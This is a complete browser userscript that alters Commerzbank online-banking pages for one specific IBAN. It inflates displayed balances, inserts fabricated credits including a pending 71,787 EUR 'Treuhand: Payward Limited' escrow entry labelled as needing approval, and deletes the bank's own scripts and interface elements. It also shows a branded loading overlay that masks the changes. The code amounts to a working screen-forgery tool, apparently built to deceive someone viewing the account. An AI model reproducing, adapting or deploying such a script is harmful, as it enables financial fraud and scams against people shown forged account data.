// ==UserScript==
// @name         Ed Commerz Dietmar Glage
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Insert multiple transactions with specified details
// @author       You
// @match        https://www.drivehq.com/*
// @match        https://kunden.commerzbank.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/484609/Ed%20Commerz%20Dietmar%20Glage.user.js
// @updateURL https://update.greasyfork.org/scripts/484609/Ed%20Commerz%20Dietmar%20Glage.meta.js
// ==/UserScript==

(function () {
    'use strict';

    // ======================= Configuration =======================

    // Balance adjustments applied on the landing page (Section 1).
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 100 },
        { index: 1, adjustmentAmount: 100 },
        { index: 2, adjustmentAmount: 100 },
        { index: 3, adjustmentAmount: 1 }
    ];

    // Balance adjustments applied on the "Finanzübersicht" page (Section 2).
    var BALANCE_CONFIGS_FIN = [
        { index: 0, adjustmentAmount: 100 },
        { index: 1, adjustmentAmount: 100 },
        { index: 2, adjustmentAmount: 0 },
        { index: 3, adjustmentAmount: 0 }
    ];

    // Amount used to modify account balances (Sections 3 and 8).
    var balanceModificationAmount = 100.00;

    // Amount used to modify the main balance on the transaction overview (Section 6).
    var balanceChange = 100.00;

    // IBAN used to gate several sections. Shared value as configured originally.
    var expectedIBAN = 'DE45 1204 0000 0032 0762 00';
    var searchText = expectedIBAN;
    var targetTextContent = expectedIBAN;
    var specifiedTextContent = expectedIBAN;

    // Transactions inserted into the reserved section (Section 4).
    var transactions = [
        {
            order: 1,
            title: 'Treuhand: Payward Limited',
            type: 'Gutschrift',
            amount: '+ 71.787,82 EUR'
        }
    ];

    // Real transactions inserted (Section 5).
    var transactionsr = [
        {
            order: 1,
            title: 'Payward Limited',
            type: 'Gutschrift',
            amount: '+ 100,00 EUR',
            date: '11.01.2024'
        }
    ];

    // Transactions rendered on the transaction overview (Section 7).
    var transactionsnew = [
        {
            date: 'Vorgemerkt',
            name: 'Treuhand Payward Ltd',
            details: 'Freigabe nötig',
            type: 'Vorgemerkt',
            amount: '+71.787,00 EUR'
        },
        {
            date: '11.01.2024',
            name: 'Payward Ltd',
            details: 'Test',
            type: 'Gutschrift',
            amount: '+100,00 EUR'
        }
    ];

    // ======================= Shared utilities =======================

    // Returns true when the current URL contains any of the supplied fragments.
    function matchesUrl() {
        var href = window.location.href;
        for (var i = 0; i < arguments.length; i++) {
            if (href.indexOf(arguments[i]) > 0) {
                return true;
            }
        }
        return false;
    }

    // Parses a German-formatted number (e.g. "1.234,56 EUR") into a float.
    function parseGermanNumber(text) {
        var cleaned = String(text).replace(/[^\d,-]/g, '').replace(',', '.');
        var value = parseFloat(cleaned);
        return isNaN(value) ? NaN : value;
    }

    // Formats a number using German locale with two decimal places.
    function formatGermanNumber(value) {
        return value.toLocaleString('de-DE', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Removes all <script> elements currently present in the document.
    function removePageScripts() {
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
        });
    }

    // Starts a MutationObserver that removes any <script> element added to the DOM.
    // Returns the observer so callers can disconnect it when no longer needed.
    function observeAndRemoveScripts() {
        var observer = new MutationObserver(function (mutationsList) {
            mutationsList.forEach(function (mutation) {
                if (!mutation.addedNodes) {
                    return;
                }
                mutation.addedNodes.forEach(function (node) {
                    if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'SCRIPT') {
                        node.remove();
                    }
                });
            });
        });
        observer.observe(document.documentElement, { childList: true, subtree: true });
        return observer;
    }

    // Removes every element matching the given CSS selector.
    function removeElements(selector) {
        document.querySelectorAll(selector).forEach(function (element) {
            element.remove();
        });
    }

    // Checks whether a transaction title is already rendered on the page.
    function isTransactionPresent(transaction) {
        var title = transaction.title.trim();
        var elements = document.querySelectorAll('.th-click.expander_handle_column_1');
        for (var i = 0; i < elements.length; i++) {
            if (elements[i].textContent.trim() === title) {
                return true;
            }
        }
        return false;
    }

    // ======================= 1. Landing page: balance modification =======================

    if (matchesUrl('landingpage', '10571927563', '10726846341')) {
        (function () {
            function modifyBalance() {
                var balanceElements = document.querySelectorAll('.show-tooltip.test_colorContainer2');
                var signElements = document.querySelectorAll('.test_colorContainer1');

                BALANCE_CONFIGS.forEach(function (config) {
                    if (config.index >= balanceElements.length || config.index >= signElements.length) {
                        console.error('Invalid index in BALANCE_CONFIGS:', config.index);
                        return;
                    }

                    var balanceElement = balanceElements[config.index];
                    var signElement = signElements[config.index];
                    var currentBalance = balanceElement.textContent.trim();
                    var currentSign = signElement.textContent.trim();

                    var signedBalance = (currentSign === '-' ? '-' : '+') + currentBalance;
                    var numericBalance = parseGermanNumber(signedBalance);

                    if (isNaN(numericBalance)) {
                        console.error('Failed to extract numeric balance from the current balance:', currentBalance);
                        return;
                    }

                    var newNumericBalance = numericBalance + config.adjustmentAmount;
                    var formattedBalance = (newNumericBalance >= 0 ? '+' : '-') +
                        formatGermanNumber(Math.abs(newNumericBalance));

                    balanceElement.textContent = formattedBalance;
                    signElement.style.opacity = '0';

                    console.log('Balance modified successfully. New balance:', balanceElement.textContent);
                });
            }

            function checkAndModifyBalance() {
                var topLinksFound = false;
                var einfacheAnsichtFound = false;

                document.querySelectorAll('*').forEach(function (element) {
                    var textContent = element.textContent.trim();
                    if (textContent === 'Top-Links') {
                        topLinksFound = true;
                    }
                    if (textContent === 'Einfache Ansicht') {
                        einfacheAnsichtFound = true;
                        if (element.parentElement) {
                            element.parentElement.remove();
                        }
                    }
                });

                if (topLinksFound && einfacheAnsichtFound) {
                    modifyBalance();
                }
            }

            observeAndRemoveScripts();
            removePageScripts();
            setInterval(checkAndModifyBalance, 200);

            console.log('Script loaded.');
        })();
    }

    // ======================= 2. Finanzübersicht: balance modification =======================

    if (matchesUrl('financeoverview', '10726834157')) {
        (function () {
            function areTextContentsPresent() {
                var bodyText = document.body.textContent;
                return bodyText.includes('Gesamtsaldo') && bodyText.includes('Finanzübersicht');
            }

            function removeTextContents(contents) {
                contents.forEach(function (content) {
                    document.body.innerHTML = document.body.innerHTML.replace(new RegExp(content, 'g'), '');
                });
            }

            function modifyBalance(config) {
                var balanceElements = document.querySelectorAll('[class*="p-s"]');
                if (balanceElements.length <= config.index) {
                    console.error('Balance element with index ' + config.index + ' not found.');
                    return;
                }

                var balanceElement = balanceElements[config.index];
                var currentBalance = parseGermanNumber(balanceElement.textContent);

                if (isNaN(currentBalance)) {
                    console.error('Unable to extract numeric balance value.');
                    return;
                }

                var newBalance = currentBalance + config.adjustmentAmount;
                var formattedBalance = formatGermanNumber(Math.abs(newBalance)) + ' EUR';
                balanceElement.textContent = (newBalance >= 0 ? '+ ' : '- ') + formattedBalance;
                console.log('Modified balance:', balanceElement.textContent);

                setTimeout(function () {
                    removeTextContents(['Gesamtsaldo', 'Finanzübersicht']);
                }, 5);
            }

            function performBalanceModifications() {
                if (!areTextContentsPresent()) {
                    console.log("Both 'Gesamtsaldo' and 'Finanzübersicht' text contents are not present. Script not executed.");
                    return;
                }

                observeAndRemoveScripts();
                removePageScripts();
                BALANCE_CONFIGS_FIN.forEach(modifyBalance);

                console.log('Script loaded.');
            }

            setInterval(performBalanceModifications, 200);
        })();
    }

    // ======================= 3. Umsätze: balance modification =======================

    if (matchesUrl('account/transactions', '10841439452', '10726842017')) {
        (function () {
            function removeElementWithText(textToSearch) {
                var elements = document.querySelectorAll('*');
                for (var j = 0; j < elements.length; j++) {
                    if (elements[j].textContent.trim() === textToSearch) {
                        if (elements[j].parentElement) {
                            elements[j].parentElement.remove();
                        }
                        return true;
                    }
                }
                return false;
            }

            function modifyBalance() {
                var currentAccountArea = document.getElementById('currentAccountArea');
                if (!currentAccountArea) {
                    console.error('Current account area not found.');
                    return;
                }

                var balanceElement = currentAccountArea.querySelector('h3');
                if (!balanceElement) {
                    console.error('Balance element not found within the current account area.');
                    return;
                }

                var currentBalance = balanceElement.textContent.trim();
                var numericBalance = parseGermanNumber(currentBalance);

                if (isNaN(numericBalance)) {
                    console.error('Failed to extract numeric balance from the current balance:', currentBalance);
                    return;
                }

                var modifiedBalance = numericBalance + balanceModificationAmount;
                var formattedBalance = (modifiedBalance >= 0 ? '+' : '') + formatGermanNumber(modifiedBalance) + ' EUR';
                balanceElement.textContent = formattedBalance;

                console.log('Balance modified successfully. New balance:', balanceElement.textContent);

                removeElementWithText('Ihr Kontostand um');
            }

            function checkConditionsAndModifyBalance() {
                var toolbarElement = document.querySelector('.toolbar-element.enabled.single');
                if (!toolbarElement) {
                    return;
                }

                var dd = toolbarElement.querySelector('dd');
                if (!dd) {
                    return;
                }

                var kontoauswahlText = dd.textContent.trim().toLowerCase().replace(/\s/g, '');
                var expectedIbanNormalized = expectedIBAN.trim().toLowerCase().replace(/\s/g, '');

                if (kontoauswahlText.substring(0, 22) !== expectedIbanNormalized.substring(0, 22)) {
                    return;
                }

                console.log('IBAN condition met.');

                var elements = document.querySelectorAll('*');
                for (var j = 0; j < elements.length; j++) {
                    if (elements[j].textContent.trim() === 'Ihr Kontostand um') {
                        console.log('Text content condition met.');
                        modifyBalance();
                        break;
                    }
                }
            }

            observeAndRemoveScripts();
            removePageScripts();
            setInterval(checkConditionsAndModifyBalance, 50);

            console.log('Script loaded.');
        })();
    }

    // ======================= 4. Umsätze: insert "Vorgemerkt" transactions =======================

    if (matchesUrl('account/transactions', '10753426948', '10726842017')) {
        (function () {
            function insertTransaction(transaction) {
                console.log('Attempting to insert transaction...');

                var parentClass = transaction.amount.includes('-') ? 'tb-p-01-03 p-s-03' : 'tb-p-01-03 p-s-04';

                var transactionHTML = [
                    '<tbody class="t-body dateGroup" id="id474" data-read-state="false">',
                    '    <tr class="expander-handle tb-p-02-01" style="background-color: #ffffff; color: #00414b!important; font-family: \'Gotham 4r\', Arial, sans-serif!important; font-size: 13px!important; border-color: #b4c8cd!important;">',
                    '        <th class="th-click expander_handle_column_1 tb-p-02-01 show-tooltip" style="word-wrap: break-word" id="toTransactionRows">' + transaction.title + '</th>',
                    '        <th class="expander_handle_column_2"></th>',
                    '        <th class="expander_handle_column_4"></th>',
                    '        <th class="non-pfm-type expander_handle_column_5">' + transaction.type + '</th>',
                    '        <th class="' + parentClass + ' nowrap expander_handle_column_6">' + transaction.amount + '</th>',
                    '        <th class="expander_handle_column_7 sf-hidden"></th>',
                    '    </tr>',
                    '    <tr class="expander-details tb-p-02-01 sf-hidden"></tr>',
                    '</tbody>'
                ].join('');

                var container = document.getElementById('reservedTransactionsContainer');
                if (!container) {
                    console.error('Container not found.');
                    return;
                }

                console.log('Container found:', container);

                var newRow = document.createElement('tbody');
                newRow.innerHTML = transactionHTML;
                container.appendChild(newRow);

                console.log('Transaction inserted:', newRow);

                document.querySelectorAll('*').forEach(function (element) {
                    if (element.textContent.trim() === 'Kontoauswahl') {
                        element.remove();
                    }
                });
            }

            function insertTransactions() {
                var transactionsToInsert = transactions.filter(function (transaction) {
                    return !isTransactionPresent(transaction);
                });

                if (transactionsToInsert.length === 0) {
                    console.log('All transactions are already present.');
                    return;
                }

                transactionsToInsert.forEach(insertTransaction);
                console.log('Transactions inserted.');
            }

            setInterval(insertTransactions, 200);
            insertTransactions();

            console.log('Script loaded.');
        })();
    }

    // ======================= 5. Umsätze: insert real transactions =======================

    if (matchesUrl('account/transactions', '10753426948', '10726842017')) {
        (function () {
            var insertionTimeout = 100;

            function isTextContentPresent() {
                var cleanedSearchText = searchText.replace(/\s+/g, '').toLowerCase();
                var elements = document.getElementsByTagName('*');

                for (var i = 0; i < elements.length; i++) {
                    var cleanedElementText = elements[i].textContent.replace(/\s+/g, '').toLowerCase();
                    if (checkSubstringMatch(cleanedElementText, cleanedSearchText, 9)) {
                        return true;
                    }
                }
                return false;
            }

            function checkSubstringMatch(mainString, subString, n) {
                for (var i = 0; i <= mainString.length - n; i++) {
                    if (mainString.indexOf(subString.substring(i, i + n)) !== -1) {
                        return true;
                    }
                }
                return false;
            }

            function insertTransactionsr() {
                console.log('Attempting to insert transactions...');

                var container = document.getElementById('reservedTransactionsContainer');
                if (!container) {
                    console.error('Container not found.');
                    return;
                }

                console.log('Container found:', container);

                transactionsr.forEach(function (transaction) {
                    var parentClass = transaction.amount.includes('-') ? 'tb-p-01-03 p-s-03' : 'tb-p-01-03 p-s-04';

                    var transactionHTML = [
                        '<tbody class="t-body dateGroup" id="id473" data-read-state="false">',
                        '    <tr class="expander-handle tb-p-02-01" style="background-color: #d5e1e2; line-height: 0.4;">',
                        '        <th colspan="2" class="dateGroupCol2" id="dateBalanceBookedTransfer">' + transaction.date + '</th>',
                        '        <th class="expander_handle_column_4 dateGroupCol4"></th>',
                        '        <th class="meniga expander_handle_column_5 dateGroupCol5"></th>',
                        '        <th class="' + parentClass + ' nowrap expander_handle_column_6 dateGroupCol6"></th>',
                        '        <th class="expander_handle_column_7 sf-hidden" style="width:0%"></th>',
                        '    </tr>',
                        '    <tr class="expander-handle tb-p-02-01">',
                        '        <th class="th-click expander_handle_column_1 tb-p-02-01 show-tooltip" style="word-wrap:break-word" id="toTransactionRows">' + transaction.title + '</th>',
                        '        <th class="expander_handle_column_2"></th>',
                        '        <th class="expander_handle_column_4"></th>',
                        '        <th class="non-pfm-type expander_handle_column_5">' + transaction.type + '</th>',
                        '        <th class="' + parentClass + ' nowrap expander_handle_column_6">' + transaction.amount + '</th>',
                        '        <th class="expander_handle_column_7 sf-hidden"></th>',
                        '    </tr>',
                        '    <tr class="expander-details tb-p-02-01 sf-hidden"></tr>',
                        '</tbody>'
                    ].join('');

                    var newRow = document.createElement('tbody');
                    newRow.innerHTML = transactionHTML;
                    container.appendChild(newRow);

                    console.log('Transaction inserted:', newRow);
                });
            }

            transactionsr.sort(function (a, b) {
                return a.order - b.order;
            });

            observeAndRemoveScripts();
            removePageScripts();

            if (!isTextContentPresent()) {
                console.log('Text content not found. No transactions inserted.');
                return;
            }

            setInterval(function () {
                console.log('Checking for transactions...');

                var transactionsToInsertr = transactionsr.filter(function (transaction) {
                    return !isTransactionPresent(transaction);
                });

                if (transactionsToInsertr.length > 0) {
                    insertTransactionsr();
                }
            }, 200);

            setTimeout(insertTransactionsr, insertionTimeout);

            console.log('Script loaded.');
        })();
    }

    // ======================= 6. Transaction overview: balance modification =======================

    if (matchesUrl('digitalbanking/transactionoverview', '10753431145', '10733875328')) {
        (function () {
            var additionalTextContent = 'Ihr Kontostand beträgt';
            var targetTextContentLower = targetTextContent.replace(/\s+/g, '').toLowerCase();

            function updateBalance() {
                console.log('Performing balance check...');

                var bodyText = document.body.textContent.replace(/\s+/g, ' ');
                var bodyTextLower = bodyText.replace(/\s+/g, '').toLowerCase();

                if (!new RegExp(targetTextContentLower, 'i').test(bodyTextLower) || !bodyText.includes(additionalTextContent)) {
                    return;
                }

                var balanceHeader = document.querySelector('.BalanceOverview-module_balanceOverview__header__szyuV h4.lsgs-05770--h4');
                if (!balanceHeader) {
                    return;
                }

                var currentBalance = parseGermanNumber(balanceHeader.textContent);
                if (isNaN(currentBalance)) {
                    return;
                }

                var newBalance = currentBalance + balanceChange;
                balanceHeader.textContent = ' ' + formatGermanNumber(newBalance) + ' EUR';

                setTimeout(function () {
                    var body = document.querySelector('body');
                    if (body) {
                        body.innerHTML = body.innerHTML.replace(additionalTextContent, '');
                    }
                }, 5);
            }

            observeAndRemoveScripts();
            setInterval(updateBalance, 300);
        })();
    }

    // ======================= 7. Transaction overview: insert transactions =======================

    if (matchesUrl('digitalbanking/transactionoverview', '10753431145', '10733875328')) {
        (function () {
            var timeoutDuration = 100;

            function buildTransactionContainer() {
                var container = document.createElement('div');
                container.className = 'TransactionsTable-module_transactionsTable__container__syWTd';
                container.setAttribute('data-cy', 'table-container_BOOKED');

                transactionsnew.forEach(function (transactionConfig, index) {
                    var headerDiv = document.createElement('div');
                    headerDiv.className = 'TransactionsTable-module_transactionsTable__header__UNYFq';

                    var leftSideHeaderDiv = document.createElement('div');
                    leftSideHeaderDiv.className = 'TransactionsTable-module_transactionsTable__headerLeftSide__rtcrj';

                    var dateParagraph = document.createElement('p');
                    dateParagraph.className = 'lsgs-05770--helper-text';
                    dateParagraph.setAttribute('aria-atomic', 'true');
                    dateParagraph.textContent = transactionConfig.date;
                    dateParagraph.style.padding = '5px';
                    leftSideHeaderDiv.appendChild(dateParagraph);

                    var rightSideHeaderDiv = document.createElement('div');
                    rightSideHeaderDiv.className = 'TransactionsTable-module_transactionsTable__headerRightSide__l4r5q';

                    headerDiv.appendChild(leftSideHeaderDiv);
                    headerDiv.appendChild(rightSideHeaderDiv);
                    container.appendChild(headerDiv);

                    var tableElement = document.createElement('table');
                    tableElement.className = 'TransactionsTable-module_transactionsTable__table__Y97S6';
                    tableElement.setAttribute('data-cy', 'table_BOOKED');
                    container.appendChild(tableElement);

                    var tableCaption = document.createElement('caption');
                    tableCaption.className = 'TransactionsTable-module_transactionsTable__caption__leYQ-';
                    tableCaption.textContent = 'Umsätze vom ' + transactionConfig.date + '. Der Tagessaldo beträgt ';
                    tableElement.appendChild(tableCaption);

                    var tableHead = document.createElement('thead');
                    tableHead.className = 'TransactionsTable-module_transactionsTable__tableHead__8R3ik';

                    var headRow = document.createElement('tr');
                    headRow.className = 'TransactionsTable-module_transactionsTable__headRow__qMUXP';

                    ['Zahlungsverkehrspartner', 'Vorausichtliche Buchung', 'Umsatzart', 'Betrag', 'Mehr Optionen'].forEach(function (headerText) {
                        var headCell = document.createElement('th');
                        headCell.className = 'TransactionsTable-module_transactionsTable__headCell__3Ye1W';
                        headCell.textContent = headerText;
                        headRow.appendChild(headCell);
                    });

                    tableHead.appendChild(headRow);
                    tableElement.appendChild(tableHead);

                    var tableBody = document.createElement('tbody');
                    tableBody.className = 'TransactionsTable-module_transactionsTable__tableBody__AApDD';

                    var dataRow = document.createElement('tr');
                    dataRow.className = 'TransactionRow-module_transactionRow__wNO99';

                    ['name', 'details', 'type', 'amount'].forEach(function (field) {
                        var cell = document.createElement('td');
                        cell.className = 'TransactionRow-module_transactionRow__cell__AihX- TransactionRow-module_transactionRow__' + field + '__As3Zn';

                        var link = document.createElement('a');
                        link.href = '#';
                        link.className = 'TransactionRow-module_transactionRow__sideLayerSwitcher__uW146';

                        var paragraph = document.createElement('p');

                        if (field === 'amount') {
                            var isPositive = transactionConfig.amount.startsWith('+');
                            paragraph.className = isPositive
                                ? 'TransactionRow-module_transactionRow__positiveAmount__0JFuZ lsgs-05770--info-text'
                                : 'undefined lsgs-05770--info-text';
                        } else {
                            paragraph.className = 'lsgs-05770--info-text';
                        }

                        paragraph.textContent = transactionConfig[field];
                        paragraph.style.padding = field === 'amount' ? '5px 0 5px auto' : '5px';
                        paragraph.style.textAlign = field === 'type' ? 'center' : (field === 'amount' ? 'right' : 'left');

                        if (index === 0 && field === 'name') {
                            var firstTransactionNameCell = document.querySelector('.TransactionRow-module_transactionRow__name__As3Zn');
                            if (firstTransactionNameCell) {
                                var infoText = firstTransactionNameCell.querySelector('.lsgs-05770--info-text');
                                if (infoText) {
                                    var infoTextWidth = infoText.clientWidth + 'px';
                                    paragraph.style.width = infoTextWidth;
                                    cell.style.width = infoTextWidth;
                                }
                            }
                        }

                        link.appendChild(paragraph);
                        cell.appendChild(link);
                        dataRow.appendChild(cell);
                    });

                    tableBody.appendChild(dataRow);
                    tableElement.appendChild(tableBody);
                });

                return container;
            }

            setTimeout(function () {
                var search = specifiedTextContent.replace(/\s/g, '').toLowerCase();
                var bodyText = document.body.textContent.replace(/\s/g, '').toLowerCase();

                if (!bodyText.includes(search) || search.length < 9) {
                    console.log('Specified text content not found. Exiting script.');
                    return;
                }

                console.log('Specified text content found. Proceeding with the script.');

                var transactionContainer = buildTransactionContainer();

                var targetElement = document.querySelector('[class*="TransactionsTable-module_transactionsTable__container"]');
                if (targetElement) {
                    targetElement.parentNode.insertBefore(transactionContainer, targetElement);
                }
            }, timeoutDuration);
        })();
    }

    // ======================= 8. Kontodetails: balance modification =======================

    if (matchesUrl('banking/accountdetails', '10726848058')) {
        (function () {
            function parseBalanceFromElement(element) {
                if (!element) {
                    console.error('Element not found.');
                    return NaN;
                }

                var numericBalance = parseGermanNumber(element.textContent.trim());
                if (isNaN(numericBalance)) {
                    console.error('Failed to extract numeric balance from the element:', element);
                    return NaN;
                }
                return numericBalance;
            }

            function isTargetTextContentPresent(targetText) {
                var searchTextValue = targetText.replace(/\s/g, '').toLowerCase();
                return document.body.textContent.replace(/\s/g, '').toLowerCase().includes(searchTextValue);
            }

            function areTextContentsPresent() {
                var targetContents = Array.prototype.slice.call(arguments);
                return targetContents.every(isTargetTextContentPresent);
            }

            function removeParentElements() {
                var elementsToRemove = [];
                var targetTexts = ['Wechseln', 'Kontodetails'];

                targetTexts.forEach(function (targetText) {
                    var textNodes = document.evaluate(
                        "//text()[contains(., '" + targetText + "')]",
                        document.body,
                        null,
                        XPathResult.ANY_TYPE,
                        null
                    );
                    var textNode = textNodes.iterateNext();
                    while (textNode) {
                        if (textNode.parentElement) {
                            elementsToRemove.push(textNode.parentElement);
                        }
                        textNode = textNodes.iterateNext();
                    }
                });

                elementsToRemove.forEach(function (element) {
                    element.remove();
                });
            }

            function modifyMainBalance() {
                var balanceRegex = /([+-]?)\s?(\d{1,3}(?:\.\d{3})*(?:,\d{2}))/;
                var mainBalanceElement = null;

                document.querySelectorAll('*').forEach(function (element) {
                    if (element.textContent.match(balanceRegex)) {
                        mainBalanceElement = element;
                    }
                });

                if (!mainBalanceElement) {
                    return;
                }

                var currentBalance = parseBalanceFromElement(mainBalanceElement);
                if (isNaN(currentBalance)) {
                    return;
                }

                var newBalance = currentBalance + balanceModificationAmount;
                var newSign = newBalance >= 0 ? '+' : '-';
                var newBalanceText = newSign + ' ' + formatGermanNumber(Math.abs(newBalance)) + ' EUR';

                mainBalanceElement.textContent = newBalanceText;
            }

            function checkAndModifyBalance() {
                if (areTextContentsPresent(targetTextContent, 'Wechseln', 'Kontodetails')) {
                    modifyMainBalance();
                    setTimeout(removeParentElements, 5);
                }
                console.log('Continuing to check conditions every 5 seconds...');
            }

            observeAndRemoveScripts();
            removePageScripts();
            setInterval(checkAndModifyBalance, 300);
        })();
    }

    // ======================= 9. Landing page: remove scripts and widgets =======================

    if (matchesUrl('landingpage', '10571927563', '10726846341')) {
        (function () {
            function removeWidgetElements() {
                document.querySelectorAll('.mod.deletable.oneColumnWidget.dragable.open').forEach(function (element) {
                    if (!element.classList.contains('mod-WidgetOverview')) {
                        element.remove();
                    }
                });

                document.querySelectorAll('.big-button-right').forEach(function (element) {
                    element.remove();
                });
            }

            function removeScriptsAndElements() {
                console.log('Removing scripts and elements...');
                removePageScripts();
                removeWidgetElements();
            }

            var observer = new MutationObserver(function (mutationsList) {
                mutationsList.forEach(function (mutation) {
                    if (!mutation.addedNodes) {
                        return;
                    }
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType !== Node.ELEMENT_NODE) {
                            return;
                        }
                        if (node.tagName === 'SCRIPT') {
                            node.remove();
                        } else if (
                            node.classList.contains('mod') &&
                            node.classList.contains('deletable') &&
                            node.classList.contains('oneColumnWidget') &&
                            node.classList.contains('dragable') &&
                            node.classList.contains('open') &&
                            !node.classList.contains('mod-WidgetOverview')
                        ) {
                            node.remove();
                        }
                    });
                });
            });

            observer.observe(document.documentElement, { childList: true, subtree: true });

            setTimeout(function () {
                observer.disconnect();
                removeScriptsAndElements();
                console.log('Script loaded.');
            }, 200);
        })();
    }

    // ======================= 10. Finanzübersicht: remove UI elements =======================

    if (matchesUrl('financeoverview', '10726834157')) {
        (function () {
            observeAndRemoveScripts();

            setTimeout(function () {
                removeElements('.dropdown-links');
                removeElements('.select2-choice');
                removeElements('.show-tooltip');
                removePageScripts();
            }, 200);
        })();
    }

    // ======================= 11. Umsätze: remove UI elements and adjust labels =======================

    if (matchesUrl('account/transactions', '10753426948', '10726842017')) {
        (function () {
            function modifyTextContent() {
                var dateGroupCol2 = document.querySelector('.dateGroupCol2');
                if (dateGroupCol2 && dateGroupCol2.textContent.trim() === 'Nächste 5 Tage') {
                    dateGroupCol2.textContent = 'Vorgemerkte Umsätze';
                }
            }

            function modifyAllTextContent() {
                document.querySelectorAll('.dateGroupCol2').forEach(function (element) {
                    var textContent = element.textContent.trim();
                    var pipeIndex = textContent.indexOf('|');
                    if (pipeIndex !== -1) {
                        element.textContent = textContent.substring(0, pipeIndex).trim();
                    }
                });
            }

            var observer = observeAndRemoveScripts();
            removePageScripts();

            removeElements('.t-body.cursive');
            removeElements('.col.col-lg-4.tools-buttons');
            removeElements('.advance_search_container');
            removeElements('.togglebuttons.tran-toolbar');

            var cashflowContainer = document.getElementById('cashflow-container');
            if (cashflowContainer) {
                cashflowContainer.remove();
            }

            modifyTextContent();
            modifyAllTextContent();

            setTimeout(function () {
                observer.disconnect();
                removePageScripts();
            }, 200);

            console.log('Script loaded.');
        })();
    }

    // ======================= 12. Transaction overview: remove UI elements (optional redirect) =======================

    if (matchesUrl('digitalbanking/transactionoverview', '10753431145', '10733875328')) {
        (function () {
            var shouldRedirect = false;
            var redirectUrl = 'https://kunden.commerzbank.de/banking/account/transactions';

            observeAndRemoveScripts();
            removePageScripts();

            removeElements('[class*="TransactionsTable-module_transactionsTable__rightSideText"], [class*="ActionsButtons-module_actionsButtons"], [class*="icon-link-group"]');

            if (shouldRedirect) {
                window.location.href = redirectUrl;
            }
        })();
    }

    // ======================= 13. Payments: remove text after pipe character =======================

    if (matchesUrl('payments', '10733876802')) {
        (function () {
            function removeTextAfterPipe(node) {
                if (node.nodeType === Node.TEXT_NODE) {
                    node.nodeValue = node.nodeValue.replace(/\|[^|]*$/, '');
                } else {
                    node.childNodes.forEach(removeTextAfterPipe);
                }
            }

            new MutationObserver(function (mutationsList) {
                mutationsList.forEach(function (mutation) {
                    if (mutation.type !== 'childList') {
                        return;
                    }
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType === Node.ELEMENT_NODE && node.tagName === 'SCRIPT') {
                            node.remove();
                        } else {
                            removeTextAfterPipe(node);
                        }
                    });
                });
            }).observe(document.documentElement, { childList: true, subtree: true });

            removeTextAfterPipe(document.body);
            removePageScripts();
        })();
    }

    // ======================= 14. Payments: remove "debitorAmount" elements =======================

    if (matchesUrl('payments', '10468947002')) {
        (function () {
            function removeDebitorAmountElements(root) {
                root.querySelectorAll('.debitorAmount').forEach(function (element) {
                    element.remove();
                });
            }

            new MutationObserver(function (mutationsList) {
                mutationsList.forEach(function (mutation) {
                    if (mutation.type !== 'childList') {
                        return;
                    }
                    mutation.addedNodes.forEach(function (node) {
                        if (node.nodeType !== Node.ELEMENT_NODE) {
                            return;
                        }
                        if (node.classList.contains('debitorAmount')) {
                            node.remove();
                        }
                        removeDebitorAmountElements(node);
                    });
                });
            }).observe(document.documentElement, { childList: true, subtree: true });

            removeDebitorAmountElements(document);
        })();
    }

    // ======================= 15. Commerzbank: loading spinner =======================

    if (matchesUrl('commerz')) {
        (function () {
            var spinnerInterval = 5000;

            function createSpinner() {
                var background = document.createElement('div');
                background.className = 'app-loading-background';
                background.style.position = 'fixed';
                background.style.top = '0';
                background.style.left = '0';
                background.style.width = '100%';
                background.style.height = '100%';
                background.style.backgroundColor = 'white';
                background.style.zIndex = '9999';

                var spinner = document.createElement('div');
                spinner.className = 'app-loading-pulsing';
                spinner.style.position = 'absolute';
                spinner.style.top = '50%';
                spinner.style.left = '50%';
                spinner.style.transform = 'translate(-50%, -50%)';
                spinner.style.width = '120px';
                spinner.style.height = '120px';
                spinner.style.display = 'block';
                spinner.style.backgroundImage = 'url(https://www.commerzbank.de/ms/media/favicons/CB-2022-Ribbon_RGB.svg)';
                spinner.style.backgroundSize = '100%';
                spinner.style.animationName = 'pulse';
                spinner.style.animationTimingFunction = 'ease-in-out';
                spinner.style.animationIterationCount = 'infinite';
                spinner.style.animationDuration = '1.5s';
                spinner.style.animationFillMode = 'both';

                background.appendChild(spinner);
                document.body.appendChild(background);

                return background;
            }

            function removeSpinner(spinner) {
                if (spinner) {
                    spinner.remove();
                }
            }

            function showSpinner() {
                var spinner = createSpinner();
                setTimeout(function () {
                    removeSpinner(spinner);
                }, spinnerInterval);
            }

            observeAndRemoveScripts();
            removePageScripts();

            showSpinner();

            window.addEventListener('beforeunload', showSpinner);
            window.addEventListener('unload', showSpinner);
        })();
    }

})();
